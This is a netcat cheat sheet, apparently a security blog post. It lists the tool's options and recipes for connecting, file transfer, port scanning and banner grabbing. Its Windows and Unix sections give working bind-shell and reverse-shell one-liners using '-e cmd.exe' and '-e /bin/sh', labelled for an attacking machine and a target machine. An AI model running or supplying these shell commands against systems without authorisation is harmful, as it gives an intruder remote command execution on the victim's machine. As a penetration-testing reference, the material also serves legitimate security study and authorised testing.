---
title:  "Netcat Cheat Sheet"
header: "Netcat Cheat Sheet"
categories: 
  - Cheatsheet
tags:
  - Netcat
---

##Usage##
Connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
Listen for inbound:	        nc -l -p port [-options] [hostname] [port]


**Options:**
	**-c:** *shell command* as `-e'; use /bin/sh to exec [dangerous!!]
	**-e:** *filename*		program to exec after connect [dangerous!!]
	**-b:**			allow broadcasts
	**-g:** *gateway*		source-routing hop point[s], up to 8
	**-G:** *num*			source-routing pointer: 4, 8, 12, ...
	**-h:**			this cruft
	**-i:** *secs*			delay interval for lines sent, ports scanned
        **-k:**                      set keepalive option on socket
	**-l:**			listen mode, for inbound connects
	**-n:**			numeric-only IP addresses, no DNS
	**-o:** *file*			hex dump of traffic
	**-p:** *port*			local port number
	**-r:**			randomize local and remote ports
	**-q:** *secs*			quit after EOF on stdin and delay of secs
	**-s:** *addr*			local source address
	**-T:** *tos*			set Type Of Service
	**-t:**			answer TELNET negotiation
	**-u:**			UDP mode
	**-v:**			verbose [use twice to be more verbose]
	**-w:** *secs*			timeout for connects and final net reads
	**-C:**		Send CRLF as line-ending
	**-z:**			zero-I/O mode [used for scanning]

Port numbers can be individual or ranges: lo-hi [inclusive];
Hyphens in port names must be backslash escaped (e.g. 'ftp\-data').

##Basic##

**TCP Port - Connecting**
`nc -nv <IP> <PORT>`

**TCP Port - Listening**
`nc -lvp <PORT>`

**Connect and return HTTP Page**
`nc -nv <IP> 80`
`HEAD / HTTP/1.1`

**File Transfer**
`nc -lvp 4444 > output.txt # Receiving End`
`nc -nv <IP> < input.txt # Sending End`

**Port Scanning**
`nc -z <IP> <PORT RANGE>`

**Banner Grabbing**
`echo "" | nc -nv -w1 <IP Address> <Ports>`

##Windows ##
**Bind Shell**
`nc -lvp 4444 -e cmd.exe`
`nc -nv <IP> 4444 # Connect to the shell`

**Reverse Shell**
`nc -lvp 443 # Attacking Machine - Waiting for shell`
`nc -nv <IP> 443 -e cmd.exe # Target Machine - sending shell`



##Nix##

**Bind Shell**
`nc -lvp 4444 -e /bin/sh`
`nc -nv <IP> 4444 # Connect to the shell`

**Reverse Shell**
`nc -lvp 443`
`nc -nv <IP> 443 -e /bin/sh`

##Additional Resources##
[SANS Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
[Wikipedia](https://en.wikipedia.org/wiki/Netcat)
